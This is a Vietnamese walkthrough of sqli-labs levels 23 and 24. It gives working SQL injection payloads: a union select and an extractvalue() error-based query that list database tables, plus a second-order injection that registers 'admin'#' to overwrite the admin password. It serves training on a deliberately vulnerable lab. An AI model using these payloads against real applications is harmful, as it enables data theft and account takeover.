# sqli-labs

Link tải lab tại [đây](https://github.com/Audi-1/sqli-labs)

- [Less-23](#Less-23)
- [Less-24](#Less-24)

## Less-23

Câu này source tương tự câu 1, chỉ có điều bị `filter` `comment` là `#` và `--`.

```php
$reg = "/#/";
$reg1 = "/--/";
$replace = "";
$id = preg_replace($reg, $replace, $id);
$id = preg_replace($reg1, $replace, $id);
```

Dưới đây là cách bypass

`?id=0'+union+select+1,2,@@datadir'`

Đơn giản chỉ là thêm `'` sau câu query. :joy:

![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-23_1.png?raw=true)

Hoặc 1 cách khác để bypass là sử dụng `extractvalue()` thần thánh, sau đó chèn `or '1'='1` vào sau câu query để chắc chắn rằng câu query sẽ không bị lỗi cú pháp.

Payload: `?id=0'+and+extractvalue(0x0a,concat(0x0a,(select+group_concat(table_name)+from+information_schema.tables+where+table_schema%3d'security')))+or+'1'='1`

![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-23_2.png?raw=true)

## Less-24

[Đây](https://github.com/Audi-1/sqli-labs/tree/master/Less-24) là source của bài này.

Source code bao gồm các `route` để `authenticate` user cơ bản như: `login`,`forgot password`,`logged-in`,`new_user`,`pass_change`...

Đọc source sơ qua thì mình tìm thấy điểm này khá thú vị ở file `pass_change.php`.

```php
$username= $_SESSION["username"];
$curr_pass= mysql_real_escape_string($_POST['current_password']);
$pass= mysql_real_escape_string($_POST['password']);
$re_pass= mysql_real_escape_string($_POST['re_password']);
	
if($pass==$re_pass)
{	
  	$sql = "UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' ";
		$res = mysql_query($sql) or die('You tried to be smart, Try harder!!!! :( ');
		$row = mysql_affected_rows();
		echo '<font size="3" color="#FFFF00">';
		echo '<center>';
		if($row==1)
		{
			echo "Password successfully updated";
	
		}
		else
		{
			header('Location: failed.php');
			//echo 'You tried to be smart, Try harder!!!! :( ';
		}
}
else
	{
		echo '<font size="5" color="#FFFF00"><center>';
		echo "Make sure New Password and Retype Password fields have same value";
		header('refresh:2, url=index.php');
	}
```

Các input của user đều được filter bởi `mysql_real_escape_string()` ngoại trừ `username`, tận dụng điều này mình có thể thay đổi `password` của `admin` mà không cần biết `current password` của `admin`. Nhưng để làm được điều này, bạn cần phải có `SESSION` của `admin` hay nói cách khác là bạn phải đăng nhập vào tài khoản `admin` thì mới có thể thay đổi được `password`.

__Idea__

Create một account mới, mà khi mình thay đổi `password` của user này thì `password` của admin sẽ bị thay đổi. Ở đây mình tạo account mới với `username` là `admin'#`. Ở đây câu hỏi đặt ra là: Nếu thay đổi `password` của user `admin'#` thì làm sao trigger ở `admin` account được?

Nhưng khi mình thay đổi `password` ở `account` `admin'#` thì câu query lúc này sẽ là:

```mysql
UPDATE users SET PASSWORD='i_hacked_u' where username='admin'#' and password='$curr_pass'
```

Tức là đã bypass thành công.

Đây là danh sách `username` khi chưa create account `admin'#`

![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-24_1.png?raw=true)

Create user `admin'#` thành công.

![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-24_2.png?raw=true)

User `admin'#` đã được thêm vào `database`

![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-24_3.png?raw=true)

Sau đó mình login vào account `admin'#` và thay đổi `password` thành `i_hacked_u`.

![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-24_4.png?raw=true)

Boom

![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-24_5.png?raw=true)

